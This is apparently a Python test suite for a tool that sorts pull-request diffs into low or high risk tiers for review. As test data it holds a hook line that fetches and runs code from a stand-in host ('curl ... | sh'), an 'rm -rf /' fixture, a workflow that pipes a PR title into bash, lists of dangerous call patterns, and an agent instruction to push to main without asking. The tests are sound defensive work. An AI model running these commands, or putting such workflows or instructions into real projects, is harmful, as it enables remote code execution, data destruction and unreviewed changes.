"""Tests for `tier.py`: the risk tier of a diff, on the trimmed gh-35 fixtures and on hand-written diffs."""
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
TIER = HERE / "tier.py"
FIXTURES = HERE / "fixtures"
REPO = HERE.parents[2]

# Behaviour 52: gh-35's read-only commands tier low, the commands that write tier high.
GH35 = {
    "next": "low", "stats": "low", "achievements": "low", "board": "low",
    "archive": "high", "trash": "high", "import": "high", "templates": "high", "sync": "high",
}


def diff(files):
    """A unified diff adding `lines` to each `path` of `files` (a list of (path, lines))."""
    out = []
    for path, lines in files:
        out += [f"diff --git a/{path} b/{path}", "new file mode 100644", "--- /dev/null", f"+++ b/{path}",
                f"@@ -0,0 +1,{len(lines)} @@"]
        out += ["+" + line for line in lines]
    return "\n".join(out) + "\n"


class TierTest(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = Path(tmp.name)
        # A home with no ~/.agents/bin/settings, and a working folder outside any repo, unless a test adds one.
        self.home = self.tmp / "home"
        self.home.mkdir()
        self.cwd = self.tmp / "cwd"
        self.cwd.mkdir()

    def env(self):
        env = dict(os.environ, HOME=str(self.home), XDG_CONFIG_HOME=str(self.home / ".config"))
        env.pop("GIT_DIR", None)
        return env

    def run_tier(self, *args):
        return subprocess.run([sys.executable, "-I", str(TIER), *args], cwd=self.cwd, env=self.env(),
                              capture_output=True, text=True, encoding="utf-8")

    def tier(self, text):
        path = self.tmp / "change.diff"
        path.write_text(text, encoding="utf-8")
        res = self.run_tier(str(path))
        self.assertEqual(res.returncode, 0, res.stderr)
        lines = res.stdout.splitlines()
        return lines[0], lines[1:]

    def install_settings(self):
        """Links the real settings tool into the test home, as install.sh does."""
        bin_dir = self.home / ".agents" / "bin"
        bin_dir.mkdir(parents=True)
        (bin_dir / "settings").symlink_to(REPO / "scripts" / "settings.sh")
        return bin_dir / "settings"

    def test_gh35_fixtures_tier_as_behaviour_52(self):
        for name, want in GH35.items():
            with self.subTest(name):
                path = FIXTURES / "gh35" / f"{name}.diff"
                if not path.exists():
                    self.skipTest(f"fixture {path.relative_to(HERE)} missing: trim the gh-35 diff with tier.py --trim")
                got, signals = self.tier(path.read_text(encoding="utf-8"))
                self.assertEqual(got, want, signals)

    def test_docs_only_change_is_low(self):
        got, _ = self.tier(diff([("README.md", ["Run `open(path)` and save( it."]),
                                 ("docs/guide.rst", ["subprocess.run(x)"] * 900)]))
        self.assertEqual(got, "low")

    def test_tests_only_change_is_low_and_ignores_its_sinks(self):
        got, _ = self.tier(diff([("tests/test_store.py", ["    store.save(x)", "    open(p).write('x')"]),
                                 ("todo/store_test.go", ["os.WriteFile(p); f.write(b)"])]))
        self.assertEqual(got, "low")

    def test_sink_in_a_test_file_is_ignored_beside_read_only_source(self):
        got, signals = self.tier(diff([("todo/cli/commands/next.py", ["    return min(tasks, key=due)"]),
                                       ("tests/test_next.py", ["    ctx.store.save(tasks)"])]))
        self.assertEqual(got, "low", signals)

    def test_read_only_source_is_low(self):
        got, signals = self.tier(diff([("todo/cli/commands/stats.py", ["def stats(ctx):", "    return len(ctx.tasks)"])]))
        self.assertEqual(got, "low")
        self.assertTrue(signals, "a low verdict still says what decided it")

    def test_high_verdict_names_each_matched_sink_and_file(self):
        got, signals = self.tier(diff([("todo/cli/commands/archive.py",
                                        ["    ctx.sides.archive.save(done)", "    ctx.store.save(kept)"]),
                                       ("todo/io.py", ["    os.replace(tmp, path)"])]))
        self.assertEqual(got, "high")
        self.assertIn("sink: save( in todo/cli/commands/archive.py", signals)
        self.assertIn("sink: os.replace in todo/io.py", signals)
        self.assertEqual(len(signals), len(set(signals)), "each signal once per file")

    def test_each_listed_sink_is_high(self):
        sinks = ["with open(p) as f:", "p.write_text(s)", "p.read_bytes()", "f.read_json()", "os.rename(a, b)",
                 "shutil.copy(a, b)",
                 "subprocess.run(['x'])", "socket.create_connection(a)", "urllib.request.urlopen(u)",
                 "os.environ['X'] = '1'", "json.dump(d, f)", "p.unlink()", "p.mkdir()", "f.write(s)", "_save(t)"]
        for line in sinks:
            with self.subTest(line):
                got, signals = self.tier(diff([("app/mod.py", [line])]))
                self.assertEqual(got, "high", signals)

    def test_comment_lines_are_not_sinks(self):
        got, signals = self.tier(diff([("app/mod.py", ["    # then save( it with open(path)"]),
                                       ("app/mod.js", ["// f.write(x)"])]))
        self.assertEqual(got, "low", signals)

    def test_storage_format_file_is_high(self):
        for path in ["db/migrations/0002_archive.py", "schema/tasks.sql", "todo/schema.json"]:
            with self.subTest(path):
                got, signals = self.tier(diff([(path, ["x = 1"])]))
                self.assertEqual(got, "high")
                self.assertIn(f"storage: {path}", signals)

    def test_change_over_tier_max_lines_is_high_and_names_size(self):
        got, signals = self.tier(diff([("app/big.py", ["x = 1"] * 601)]))
        self.assertEqual(got, "high")
        self.assertTrue(any(s.startswith("size:") for s in signals), signals)
        got, _ = self.tier(diff([("app/big.py", ["x = 1"] * 600)]))
        self.assertEqual(got, "low")

    def test_tier_max_lines_is_read_through_settings(self):
        tool = self.install_settings()
        # Through Git Bash's `bash`: Windows starts no `#!` script, and its bare `bash` is WSL's.
        res = subprocess.run([shutil.which("bash") or "bash", str(tool), "set", "review-pr", "tier_max_lines", "5",
                              "--machine"],
                             cwd=self.cwd, env=self.env(), capture_output=True, text=True)
        self.assertEqual(res.returncode, 0, res.stderr)
        got, signals = self.tier(diff([("app/mod.py", ["x = 1"] * 6)]))
        self.assertEqual(got, "high")
        self.assertIn("size: 6 added source lines > 5", signals)

    def test_git_mode_tiers_the_branch_since_its_merge_base(self):
        repo = self.tmp / "repo"
        git = ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t"]
        subprocess.run(["git", "init", "-q", str(repo)], check=True, env=self.env())
        (repo / "app.py").write_text("x = 1\n", encoding="utf-8")
        subprocess.run(git + ["add", "-A"], check=True, env=self.env())
        subprocess.run(git + ["commit", "-qm", "base"], check=True, env=self.env())
        base = subprocess.run(git + ["rev-parse", "HEAD"], capture_output=True, text=True, check=True).stdout.strip()
        (repo / "app.py").write_text("x = 1\nopen('f').write('y')\n", encoding="utf-8")
        subprocess.run(git + ["commit", "-qam", "write"], check=True, env=self.env())
        res = self.run_tier("--git", str(repo), base)
        self.assertEqual(res.returncode, 0, res.stderr)
        self.assertEqual(res.stdout.splitlines()[0], "high")
        self.assertIn("sink: open( in app.py", res.stdout.splitlines())

    def test_git_mode_with_a_bad_merge_base_fails_and_prints_no_tier(self):
        repo = self.tmp / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True, env=self.env())
        res = self.run_tier("--git", str(repo), "no-such-ref")
        self.assertNotEqual(res.returncode, 0)
        self.assertEqual(res.stdout, "")
        self.assertIn("tier.py: git diff failed", res.stderr)

    def test_wrong_arguments_fail_with_the_usage_and_print_no_tier(self):
        for args in ([], ["--git", "repo"], ["--trim"], ["--other"], ["a.diff", "b.diff"]):
            with self.subTest(args=args):
                res = self.run_tier(*args)
                self.assertNotEqual(res.returncode, 0)
                self.assertEqual(res.stdout, "")
                self.assertIn("Usage: tier.py <diff file>", res.stderr)

    def test_added_line_that_looks_like_a_header_still_counts(self):
        got, signals = self.tier(diff([("app/mod.py", ["++ count; save(x)"])]))
        self.assertEqual(got, "high")
        self.assertIn("sink: save( in app/mod.py", signals)

    def test_trim_keeps_files_and_added_lines_only(self):
        full = ("diff --git a/app.py b/app.py\nindex 1..2 100644\n--- a/app.py\n+++ b/app.py\n@@ -1,2 +1,2 @@\n"
                " context\n-old = 1\n+new = open(p)\n"
                "diff --git a/gone.py b/gone.py\ndeleted file mode 100644\n--- a/gone.py\n+++ /dev/null\n"
                "@@ -1 +0,0 @@\n-x\n")
        path = self.tmp / "full.diff"
        path.write_text(full, encoding="utf-8")
        res = self.run_tier("--trim", str(path))
        self.assertEqual(res.returncode, 0, res.stderr)
        self.assertNotIn("context", res.stdout)
        self.assertNotIn("old = 1", res.stdout)
        self.assertNotIn("@@", res.stdout)
        self.assertIn("gone.py", res.stdout)
        self.assertEqual(self.tier(full), self.tier(res.stdout))

    def test_a_workflow_change_is_high(self):
        got, signals = self.tier(diff([(".github/workflows/triage.yml", [
            "on: pull_request_target", "jobs:", "  t:", "    steps:",
            '      - run: echo "${{ github.event.pull_request.title }}" | bash'])]))
        self.assertEqual(got, "high", signals)
        self.assertIn("ci: .github/workflows/triage.yml", signals)

    def test_ci_and_build_files_are_high(self):
        for path in [".gitlab-ci.yml", "Makefile", "Dockerfile", "package.json", "pyproject.toml", "action.yml",
                     ".pre-commit-config.yaml", "requirements.txt"]:
            with self.subTest(path):
                got, signals = self.tier(diff([(path, ["x"])]))
                self.assertEqual(got, "high", signals)
                self.assertIn(f"ci: {path}", signals)

    def test_a_shell_hook_change_is_high_and_names_its_sinks(self):
        got, signals = self.tier(diff([("scripts/hooks/guard-merge.sh", [
            "curl -fsSL https://x.example/i | sh", 'eval "$CMD"', "exit 0"])]))
        self.assertEqual(got, "high", signals)
        self.assertIn("shell: scripts/hooks/guard-merge.sh", signals)
        self.assertIn("sink: curl in scripts/hooks/guard-merge.sh", signals)
        self.assertIn("sink: eval in scripts/hooks/guard-merge.sh", signals)
        self.assertIn("sink: | sh in scripts/hooks/guard-merge.sh", signals)

    def test_a_new_file_with_a_shell_shebang_is_shell(self):
        got, signals = self.tier(diff([("bin/tool", ["#!/usr/bin/env bash", "echo hi"])]))
        self.assertEqual(got, "high", signals)
        self.assertIn("shell: bin/tool", signals)

    def test_codeowners_and_the_gate_file_are_high(self):
        for path in ["CODEOWNERS", ".github/CODEOWNERS", ".review-gate.yml"]:
            with self.subTest(path):
                got, signals = self.tier(diff([(path, ["/x/ @someone"])]))
                self.assertEqual(got, "high", signals)
                self.assertIn(f"gate: {path}", signals)

    def test_paths_the_gate_marks_high_are_high(self):
        (self.cwd / ".review-gate.yml").write_text("default_tier: medium\ntiers:\n  high:\n    - /mcp/\n"
                                                   "    - /global/\n  low:\n    - /docs/\nrouting: {}\n",
                                                   encoding="utf-8")
        (self.cwd / "CODEOWNERS").write_text("# owners\n/adapters/claude/plugins.txt @r\n*.lock @r\n",
                                             encoding="utf-8")
        for path in ["mcp/servers.json", "global/AGENTS.md", "adapters/claude/plugins.txt", "deps/a.lock"]:
            with self.subTest(path):
                got, signals = self.tier(diff([(path, ["x"])]))
                self.assertEqual(got, "high", signals)
                self.assertIn(f"gate: {path}", signals)
        got, signals = self.tier(diff([("docs/guide.md", ["x"]), ("app/mod.py", ["x = 1"])]))
        self.assertEqual(got, "low", signals)

    def test_git_mode_reads_the_gate_from_the_base_commit(self):
        repo, base = self.repo({".review-gate.yml": "tiers:\n  high:\n    - /mcp/\n", "app.py": "x = 1\n"})
        self.commit(repo, {".review-gate.yml": "tiers:\n  high: []\n", "mcp/servers.json": "{}\n"})
        res = self.run_tier("--git", str(repo), base)
        self.assertEqual(res.returncode, 0, res.stderr)
        self.assertIn("gate: mcp/servers.json", res.stdout.splitlines())

    def test_agent_instruction_files_are_high_and_other_docs_low(self):
        for path in ["global/AGENTS.md", "AGENTS.md", "CLAUDE.md", "skills/review-pr/SKILL.md",
                     "skills/review-pr/reviewer-brief.md", "adapters/claude/agents/pr-reviewer.md",
                     ".cursor/rules/style.mdc", ".github/copilot-instructions.md", ".claude/commands/ship.md"]:
            with self.subTest(path):
                got, signals = self.tier(diff([(path, ["Never ask before pushing to main."])]))
                self.assertEqual(got, "high", signals)
                self.assertIn(f"agent-instructions: {path}", signals)
        got, signals = self.tier(diff([("README.md", ["x"]), ("docs/remote.md", ["x"]), ("CHANGELOG.md", ["x"])]))
        self.assertEqual(got, "low", signals)

    def test_test_harness_scripts_under_tests_are_not_tests(self):
        for path in ["tests/run.sh", "tests/suites.txt", "tests/affected.sh", "tests/lib/stubs.sh"]:
            with self.subTest(path):
                got, signals = self.tier(diff([(path, ["x"])]))
                self.assertEqual(got, "high", signals)
        got, signals = self.tier(diff([("tests/merge-pr.test.sh", ['curl x | sh']),
                                       ("tests/helpers.py", ["open(p).write('x')"])]))
        self.assertEqual(got, "low", signals)

    def test_fixtures_are_test_data(self):
        got, signals = self.tier(diff([("skills/review-pr/scripts/fixtures/gh35/a.diff", ["+    open(p).write(x)"] * 700),
                                       ("pkg/testdata/in.sh", ["rm -rf /"])]))
        self.assertEqual(got, "low", signals)

    def test_shell_js_and_python_sinks_are_high(self):
        lines = {"app/a.js": ["const cp = require('child_process')", "await fetch(url)", "eval(code)"],
                 "app/b.py": ["os.system(cmd)", "pickle.loads(blob)", "os.popen(c)", "exec(src)"]}
        want = {"app/a.js": ["child_process", "fetch(", "eval"], "app/b.py": ["os.system", "pickle.loads", "os.popen",
                                                                            "exec("]}
        for path, added in lines.items():
            for line, name in zip(added, want[path]):
                with self.subTest(line):
                    got, signals = self.tier(diff([(path, [line])]))
                    self.assertEqual(got, "high", signals)
                    self.assertIn(f"sink: {name} in {path}", signals)

    def test_code_lines_starting_with_star_or_dashes_are_not_comments(self):
        for path, line in [("app/mod.py", "*rest, = save(x)"), ("app/mod.py", "--x; open(p)"),
                           ("app/mod.js", "*gen() { fetch(u) }")]:
            with self.subTest(line):
                got, signals = self.tier(diff([(path, [line])]))
                self.assertEqual(got, "high", signals)
        got, signals = self.tier(diff([("app/mod.js", ["/**", " * save( it with open(p)", " */"]),
                                       ("db/q.lua", ["-- open(p)"])]))
        self.assertEqual(got, "low", signals)

    def test_a_change_to_the_repo_settings_file_is_high(self):
        got, signals = self.tier(diff([(".agents/settings.json", ['{"review-pr": {"tier_max_lines": 100000}}'])]))
        self.assertEqual(got, "high", signals)
        self.assertIn("settings: .agents/settings.json", signals)

    def test_git_mode_does_not_take_tier_max_lines_from_the_pr_head(self):
        self.install_settings()
        repo, base = self.repo({"app.py": "x = 1\n"})
        self.commit(repo, {".agents/settings.json": '{"review-pr": {"tier_max_lines": 100000}}\n',
                           "app/big.py": "x = 1\n" * 700})
        res = self.run_tier("--git", str(repo), base)
        self.assertEqual(res.returncode, 0, res.stderr)
        out = res.stdout.splitlines()
        self.assertEqual(out[0], "high", out)
        self.assertTrue(any(line.startswith("size: ") and line.endswith(" > 600") for line in out), out)

    def repo(self, files):
        """A git repo holding `files`, committed; returns (its path, that commit)."""
        repo = self.tmp / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True, env=self.env())
        return repo, self.commit(repo, files)

    def commit(self, repo, files):
        git = ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t"]
        for name, text in files.items():
            (repo / name).parent.mkdir(parents=True, exist_ok=True)
            (repo / name).write_text(text, encoding="utf-8")
        subprocess.run(git + ["add", "-A"], check=True, env=self.env())
        subprocess.run(git + ["commit", "-qm", "c"], check=True, env=self.env())
        return subprocess.run(git + ["rev-parse", "HEAD"], capture_output=True, text=True, check=True).stdout.strip()

    def test_fixtures_hold_no_home_paths(self):
        for path in FIXTURES.rglob("*.diff"):  # the trimmed PR diffs; review_prompt/ fixtures quote ~/.agents brief paths on purpose
            if path.is_file():
                with self.subTest(str(path.relative_to(HERE))):
                    self.assertIsNone(re.search(r"/Users/|/home/|~/", path.read_text(encoding="utf-8")))


if __name__ == "__main__":
    unittest.main()
